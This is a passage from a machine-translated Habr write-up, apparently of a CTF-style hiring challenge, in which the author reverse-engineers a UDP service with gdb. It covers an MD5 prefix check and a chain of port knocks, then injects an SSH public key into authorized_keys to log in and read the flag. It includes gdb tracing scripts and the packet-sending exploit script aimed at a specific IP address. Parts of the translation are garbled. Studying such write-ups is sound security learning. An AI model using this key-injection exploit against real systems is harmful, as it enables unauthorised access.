PTR [rdi],rsp 82731e: 48 89 df mov rdi,rbx 827321: e8 5f 94 fe ff call 810785 &lt;MD5_Final@@Base+0x18d4d1&gt; 827326: e9 d7 a5 2d 00 jmp b01902 &lt;MD5_Init@@Base+0x7569&gt; b01902: 85 c0 test eax,eax b01904: 0f 84 dd 02 c2 ff je 721be7 &lt;MD5_Final@@Base+0x9e933&gt; b0190a: e9 7c a9 bb ff jmp 6bc28b &lt;MD5_Final@@Base+0x38fd7&gt;</span></span></code> </pre> <br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在链中，在0x810758处调用该函数并处理其结果。</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将break设置为0xb01902，发送数据包。</font></font><br><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回码（rax寄存器）</font></font></b> <div class="spoiler_text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（gdb）b * 0xb01902（gdb）处的</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">断点2 </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">c </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">继续。</font><font style="vertical-align: inherit;">在MD5_Init（）</font><font style="vertical-align: inherit;">（gdb）info reg rax </font><font style="vertical-align: inherit;">rax 0x0 0中</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">验证74657374 </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">00f82488 </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">断点2、0x0000000000b01902</font></font><br><font style="vertical-align: inherit;"></font><br><font style="vertical-align: inherit;"></font><br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代码0表示无效数据。因此，我们假设对于正确的解决方案，我们需要返回的代码不是0。</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在进一步的研究过程中，我浏览了gdb，它</font><font style="vertical-align: inherit;">在发送数据包（也发送“测试”）时</font><font style="vertical-align: inherit;">传递给</font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MD5_Update</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数</font><font style="vertical-align: inherit;">。</font></font><br><br><div class="spoiler">  <b class="spoiler_title">结果</b> <div class="spoiler_text"><pre> <code class="bash hljs">(gdb) b MD5_Update Breakpoint 3 at 0x4c487d (2 locations) (gdb) c Continuing. Verifying 74657374 Breakpoint 3, 0x00000000004c487d <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> MD5_Update () (gdb) info reg rsi rsi 0x7fffffffdd90 140737488346512 (gdb) x/20bx <span class="hljs-variable"><span class="hljs-variable">$rsi</span></span> 0x7fffffffdd90: 0x74 0x65 0x73 0x74 0x0a 0xff 0x7f 0x00 0x7fffffffdd98: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdda0: 0x00 0x00 0x00 0x00 (gdb) info reg <span class="hljs-variable"><span class="hljs-variable">$rdx</span></span> rdx 0x200 512</code> </pre> <br></div></div><br><h4> 结果 </h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MD5是从我们发送的消息中计算得出的，但读取的数据大小为512字节。在处理了数据之后，我发现MD5是从发送的数据中算起的，零填充了512个字节。但是您需要至少发送8个字节才能替换存储在堆栈中的8个字节。显然，一些地址存储在那里。服务为每个传入数据包显示的4个字节与MD5和的前3个字节相对应，并附加一个零。</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我返回到函数0x810758及其返回代码0。返回值存储在RAX寄存器中。为了确定返回码，我在函数0x810758的地址和执行0x827326之后的地址处设置了2个断点。</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我发送了数据，指向0x810758的位置起作用了。我在gdb中启动了脚本：</font></font><br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> gdb <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> open(<span class="hljs-string"><span class="hljs-string">"flow.log"</span></span>, <span class="hljs-string"><span class="hljs-string">"w"</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> fw: <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> <span class="hljs-number"><span class="hljs-number">1</span></span>: s = gdb.execute(<span class="hljs-string"><span class="hljs-string">"info reg rip"</span></span>, to_string=<span class="hljs-keyword"><span class="hljs-keyword">True</span></span>) s = s[s.find(<span class="hljs-string"><span class="hljs-string">"0x"</span></span>):] gdb.execute(<span class="hljs-string"><span class="hljs-string">"ni"</span></span>, to_string=<span class="hljs-keyword"><span class="hljs-keyword">True</span></span>) address = s.split(<span class="hljs-string"><span class="hljs-string">"\t"</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>].strip() fw.write(address + <span class="hljs-string"><span class="hljs-string">"\r\n"</span></span>) address = int(address, <span class="hljs-number"><span class="hljs-number">16</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> address == <span class="hljs-number"><span class="hljs-number">0x827326</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">break</span></span></code> </pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我得到了文件</font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">flow.log，</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其中包含正在执行的功能执行过程中传递的所有地址。</font><font style="vertical-align: inherit;">实际上，这并不是那么简单，但是最后我来到了这一点。</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">objdmp的</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">反汇编代码</font><font style="vertical-align: inherit;">准备了文件“ </font><b><font style="vertical-align: inherit;">disasm.log</font></b><font style="vertical-align: inherit;"> ”，以使其易于读取，例如“ </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">address：instruction</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ”，而无需多余的行。</font></font><br><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我启动了这样的脚本</font></font></b> <div class="spoiler_text"><pre> <code class="python hljs">F_NAME = <span class="hljs-string"><span class="hljs-string">"disasm.log"</span></span> F_FLOW = <span class="hljs-string"><span class="hljs-string">"flow.log"</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">prepare_code_flow</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(f_path)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> open(f_path, <span class="hljs-string"><span class="hljs-string">"rb"</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> fr: data = fr.readlines() data = filter(<span class="hljs-keyword"><span class="hljs-keyword">lambda</span></span> x: x, data) start_address = long(data[<span class="hljs-number"><span class="hljs-number">0</span></span>].split(<span class="hljs-string"><span class="hljs-string">":"</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>], <span class="hljs-number"><span class="hljs-number">16</span></span>) end_address = long(data[<span class="hljs-number"><span class="hljs-number">-1</span></span>].split(<span class="hljs-string"><span class="hljs-string">":"</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>], <span class="hljs-number"><span class="hljs-number">16</span></span>) res = [<span class="hljs-string"><span class="hljs-string">""</span></span>] * (end_address - start_address + <span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> _d <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> data: _d = _d.split(<span class="hljs-string"><span class="hljs-string">":"</span></span>) res[long(_d[<span class="hljs-number"><span class="hljs-number">0</span></span>].strip(), <span class="hljs-number"><span class="hljs-number">16</span></span>) - start_address] = <span class="hljs-string"><span class="hljs-string">""</span></span>.join(_d[<span class="hljs-number"><span class="hljs-number">1</span></span>:]).strip() <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> start_address, res <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">parse_instruction</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(code)</span></span></span><span class="hljs-function">:</span></span> mnem = code[:<span class="hljs-number"><span class="hljs-number">7</span></span>].strip() ops = code[<span class="hljs-number"><span class="hljs-number">7</span></span>:].split(<span class="hljs-string"><span class="hljs-string">","</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> [mnem] + ops <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">process_instruction</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(code)</span></span></span><span class="hljs-function">:</span></span> parse_data = parse_instruction(code) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> parse_data[<span class="hljs-number"><span class="hljs-number">1</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> [<span class="hljs-string"><span class="hljs-string">"rax"</span></span>, <span class="hljs-string"><span class="hljs-string">"eax"</span></span>, <span class="hljs-string"><span class="hljs-string">"al"</span></span>]: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">True</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">False</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> __name__ == <span class="hljs-string"><span class="hljs-string">'__main__'</span></span>: <span class="hljs-comment"><span class="hljs-comment"># Prepare disassemble data start_address, codes = prepare_code_flow(F_NAME) with open(F_FLOW, "rb") as fr: lines = fr.readlines() lines.reverse() lines = filter(lambda x: x, lines) count = 0 for _l in lines: offset = long(_l.strip(), 16) - start_address if process_instruction(codes[offset]): print str(count) + " " + hex(offset + start_address) + " " + codes[offset] break count += 1 continue</span></span></code> </pre> <br><br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 脚本只是简单地从末尾“返回”地址，直到它在指令的第一个操作数中接收到RAX寄存器为止。 </font></font>结果： <br> <code>0x67c27c mov DWORD PTR [rbp-0x14], 0x0</code> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是零值。</font><font style="vertical-align: inherit;">接下来，只需退回到任何分支（文件“ </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">flow.log</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ”）：</font></font><br><br><pre> <code class="plaintext hljs">95b6ad: jmp 73d0d1 &lt;MD5_Final@@Base+0xb9e1d&gt; 95b6b2: cmp DWORD PTR [rbp-0x2d4],0x133337 95b6bc: jne 67c270 &lt;MD5_Update@@Base+0x1b79f3&gt;</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">地址0x95b6b2是某个值与0x133337的比较。</font><font style="vertical-align: inherit;">断点，看[rbp-0x2d4]。</font><font style="vertical-align: inherit;">为此，请向数据包发送数据“ testtest”：</font></font><br><br><pre> <code class="plaintext hljs"># echo -n "testtest" &gt; md5.bin # truncate -s 512 md5.bin # md5sum md5.bin e9b9de230bdc85f3e929b0d2495d0323 md5.bin # echo -n "testtest" &gt; /dev/udp/127.0.0.1/5432 (gdb) b *0x95b6b2 Breakpoint 6 at 0x95b6b2 (gdb) c Continuing. Verifying 74657374 00deb9e9 Breakpoint 6, 0x000000000095b6b2 in MD5_Final () (gdb) x/20bx $rbp-0x2d4 0x7fffffffdd7c: 0xe9 0xb9 0xde 0x00 0xe9 0xb9 0xde 0x23 0x7fffffffdd84: 0x0b 0xdc 0x85 0xf3 0xe9 0x29 0xb0 0xd2 0x7fffffffdd8c: 0x49 0x5d 0x03 0x23</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">匹配MD5和的前3个字节。解决方案归结为使用前3个字节“ \ x37 \ x33 \ x13”来获取MD5和。</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个简单的脚本，可以使用二进制形式MD5将计算从零开始迭代到所需的匹配。发送所需的数据已接收。我们发送数据并从服务接收到有关指定新端口以接收数据的消息：</font></font><br><br><pre> <code class="plaintext hljs">New salt 508bd11b Next port 14235 Binding 14235 Waiting for data...3 14235 0</code> </pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Netstat没有显示此端口，也没有显示新端口。但是ps显示存在终止的子进程（僵尸）。想法是端口在子进程中打开了一段时间。</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我将必要的数据包发送到端口5432，然后发送到端口14235。什么也没有。端口已停止打开。结果，我以正确的起点生成了其他数据，并因此生成了MD5。再次发送消息，但是这次使用不同的端口。重新启动服务后，第一个MD5再次与端口14235一起工作。有人认为该服务会记住用完的MD5。因此，每次重新启动服务时都进行了测试。</font></font><br><br><div class="spoiler">  <b class="spoiler_title">结果</b> <div class="spoiler_text"><pre> <code class="plaintext hljs">Binding 22 Waiting for data...Verifying 1BFFFFFFD1FFFFFF8B50 00133337 New salt 508bd11b Next port 14235 Binding 14235 Waiting for data...Received packet from 127.0.0.1:43614 Data: 3 14235 27 Next port 23038 Binding 23038 Waiting for data...4</code> </pre> <br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">再次是一个新端口。在这里，我开始认为港口链可能会很长。</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实际上，下一个港口（31841）是最后一个。经过一段时间使用gdb以及反汇编的代码和各种测试之后，我发现出现了文件“ /home/task/.ssh/authorized_keys”。</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进一步发现文件外观的原因已成为时间问题，这也将写入文件中。结果，在第一个到最后一个打开的端口之后发送的数据包数据将被写入文件（如果不清楚，将在下面的脚本中看到）。</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进一步生成RSA密钥并发送给公众。</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后通过SSH在服务器上进行授权，搜索并获取标志。</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在申请过程中，只有第三个生成的MD5和对我有用。</font><font style="vertical-align: inherit;">完成任务后，我从相反的结果中发现，实际上，第三笔金额将始终有效（或者更确切地说，在某个计数器到期之前）。</font><font style="vertical-align: inherit;">为了使和连续运行，必须在数据包数据的前4个字节（从中考虑MD5）中传输的int型整数为负，即设置第四个字节的第一位（反向字节顺序）。</font></font><br><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以下是解决问题时用于传输RSA密钥的脚本。</font></font></b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> socket <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> time <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> SocketServer <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> select d = [<span class="hljs-string"><span class="hljs-string">'\x1b\xd1\x8bP\x00\x00\x00\x00'</span></span>, <span class="hljs-string"><span class="hljs-string">'\x16\xbc\xf9 \x00\x00\x00\x00'</span></span>, <span class="hljs-string"><span class="hljs-string">'"\xa5I\x90\x00\x00\x00\x00\x00\x00'</span></span>] s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Send 1"</span></span> s.sendto(d[<span class="hljs-number"><span class="hljs-number">0</span></span>], (<span class="hljs-string"><span class="hljs-string">"95.216.185.52"</span></span>, <span class="hljs-number"><span class="hljs-number">5432</span></span>)) time.sleep(<span class="hljs-number"><span class="hljs-number">0.2</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Send 2"</span></span> s.sendto(d[<span class="hljs-number"><span class="hljs-number">1</span></span>], (<span class="hljs-string"><span class="hljs-string">"95.216.185.52"</span></span>, <span class="hljs-number"><span class="hljs-number">5432</span></span>)) time.sleep(<span class="hljs-number"><span class="hljs-number">0.2</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Send 3"</span></span> s.sendto(d[<span class="hljs-number"><span class="hljs-number">2</span></span>], (<span class="hljs-string"><span class="hljs-string">"95.216.185.52"</span></span>, <span class="hljs-number"><span class="hljs-number">5432</span></span>)) time.sleep(<span class="hljs-number"><span class="hljs-number">0.2</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Send 4"</span></span> s.sendto(<span class="hljs-string"><span class="hljs-string">"\x00"</span></span>, (<span class="hljs-string"><span class="hljs-string">"95.216.185.52"</span></span>, <span class="hljs-number"><span class="hljs-number">41357</span></span>)) time.sleep(<span class="hljs-number"><span class="hljs-number">0.2</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Send 5"</span></span> s.sendto(<span class="hljs-string"><span class="hljs-string">"\x04"</span></span>, (<span class="hljs-string"><span class="hljs-string">"95.216.185.52"</span></span>, <span class="hljs-number"><span class="hljs-number">42381</span></span>)) <span class="hljs-comment"><span class="hljs-comment"># for i in range(256): time.sleep(0.2) print "Send 6" s.sendto("\x02", ("95.216.185.52", 28709)) # Read key with open("ssh_key.txt", "rb") as fr: data = fr.read() print len(data) print "Send 7" s.sendto(data, ("95.216.185.52", 28709)) print s.recvfrom(1500) s.close()</span></span></code> </pre> <br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索的行：</font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志{a1ec3c43cae4250faa302c412c7cc524}</font></font></b> <br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果成功，则响应为“ OK”。</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实际上，正如我所写的那样，发送第一和第二个MD5总和是多余的。</font><font style="vertical-align: inherit;">我还认为，不是所有事情都是由要求决定的，而是被选择的。</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我认为我不会收到邀请，从作业开始到发送标语为止已经过去了40个小时。</font></font>谢谢啦 </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN440312/">https://habr.com/ru/post/zh-CN440312/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN440302/index.html">CRM-成功成本，错误成本，拥有成本</a></li>
<li><a href="../zh-CN440304/index.html">来自x86系统中的外部设备的中断。 第3部分。使用coreboot示例在芯片组中配置中断路由</a></li>
<li><a href="../zh-CN440306/index.html">高负载系统中的数据库扩展</a></li>
<li><a href="../zh-CN440308/index.html">分而治之，或慢慢写-快速阅读</a></li>
<li><a href="../zh-CN440310/index.html">如何教机器理解发票并从中提取数据</a></li>
<li><a href="../zh-CN440314/index.html">JDK 12发行候选：Shenandoah，G1，JMH，Arm64。 Swing中的错误会反击</a></li>
<li><a href="../zh-CN440316/index.html">三角形中点的均匀分布</a></li>
<li><a href="../zh-CN440318/index.html">GDPR：如何处理您的员工，自由职业者和欧洲交易对手员工的个人数据</a></li>
<li><a href="../zh-CN440320/index.html">当我们在DMRSE Yandex计数器中计时时</a></li>
<li><a href="../zh-CN440322/index.html">为什么HDD出现故障的可能性降低</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>